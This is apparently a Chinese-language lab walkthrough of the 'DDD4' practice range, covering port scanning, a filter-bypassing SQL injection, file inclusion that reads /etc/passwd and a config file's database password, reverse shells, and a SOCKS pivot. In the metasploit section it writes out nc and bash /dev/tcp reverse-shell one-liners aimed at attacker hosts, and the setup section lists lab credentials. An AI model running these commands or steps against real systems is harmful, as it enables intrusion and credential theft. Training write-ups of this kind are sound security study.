## DDD4

### 0x01 环境搭配

```
centos
root
!@#ASD123.

centos
moon
moonQWE123

10.10.10.10:8080
moonsec123

web服务器
www.ddd4.com
admin
admin8899
ssh登录和密码
moonsec
yanisy123
```

![image-20210210194815204](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20210210194815204.png)

#### 0x02 信息收集

#### 主机发现

```
nmap -sn 192.168.0.1/24
```

发现端口

```
masscan -p 1-65535 192.168.0.122 --rate=1000
```

```
sudo masscan -p 1-65535 192.168.0.122 --rate=1000 端口
```

详细信息

```
nmap -sC -p 8888,3306,888,21,80 -A 192.168.0.122 -oA ddd4-port
```

```
gobuster dir -u http://www.ddd4.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html' -o dirlog --wildcard -l | grep -v "10280" | grep -v "49"
```

目标点403时目录，200时访问成功了。

```
whatweb http://www.ddd4.com
获取到的header信息
```

### 0x03 源码审计

SQL注入 alipay.php

![image-20210210234933321](https://i.loli.net/2021/02/10/sHaS372JP4pY5gI.png)

没有过滤，直接杀。

```
function checkSqlStr($string)
{
	$string = strtolower($string);
	return preg_match('/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|_user/i', $string);
}
```

这个假过滤，可以用url编码进行绕过

```
!checkSqlStr($request['keyword'])? $request['keyword'] = $request['keyword'] : exit('非法字符');
$keyword = urldecode($request['keyword']);

```

二次编码的最终奥义在于，后端服务器会自带一次编码，然后他又调用，他就只有死

继续拓展利用这个权限。

```
数据库密码不能直接解密 
1.分析加密方式进行处理
2.利用sql注入替换表中数据
```

文件包含

![image-20210211004002072](https://i.loli.net/2021/02/11/8PovGW9eNVFwAp1.png)

文件包含，%00截断，游戏开始真正有趣了起来。

![image-20210211005813054](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20210211005813054.png)

远程的数据库链接，就是直接rwctf的那道题的简化版，打他兄弟们，开始利用了。

![image-20210211010016016](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20210211010016016.png)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
host123:x:1000:1000:host123,,,:/home/host123:/bin/bash
smmta:x:121:129:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:122:130:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
www:x:1001:1001::/home/www:/sbin/nologin
mysql:x:1002:1002::/home/mysql:/sbin/nologin
guest-5bxieb:x:999:999:访客:/tmp/guest-5bxieb:/bin/bash
```

![image-20210211010232883](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20210211010232883.png)

拿到了目录。

```
/www/wwwroot/www.ddd4.com/config/doc-config-cn.php
```

配置文件有了。

![image-20210211010316780](C:\Users\Crawler\AppData\Roaming\Typora\typora-user-images\image-20210211010316780.png)

下一步就是登陆后台进行修改密码了，然后进行后台绕过，游戏ending。

```
define('DB_HOSTNAME','localhost');
define('DB_USER','www_ddd4_com');
define('DB_PASSWORD','x4ix6ZrM7b8nFYHn');
define('DB_DBNAME','www_ddd4_com');
define('TB_PREFIX','doc_');
```

#### 0x04 metasploit上线了

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.129 8888 >/tmp/f
bash -i >& /dev/tcp/192.168.174.128/9090 0>&1
```

替换反弹shell的乱码问题

```
bash -i >& /dev/tcp/192.168.0.129/9090 0>&1
先设置好python的shell
python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z放到后台中
stty raw -echo
fg 
```

![image-20210213110042676](https://i.loli.net/2021/02/13/RmZdT3o4LnKWeVM.png)

```
10.10.10.144    www.ddd5.com
```

socks4 代理极其不稳定

```
https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz
```

```
在 kali host123 都需要进行编译生成文件
下载完进行解压 -tar -zxvf ssocks-0.0.14.tar.gz
cd ssocks-0.0.14
./configuire && make
在 kali 执行
./rcsocks -l 2233 -p 1080 -vv
```

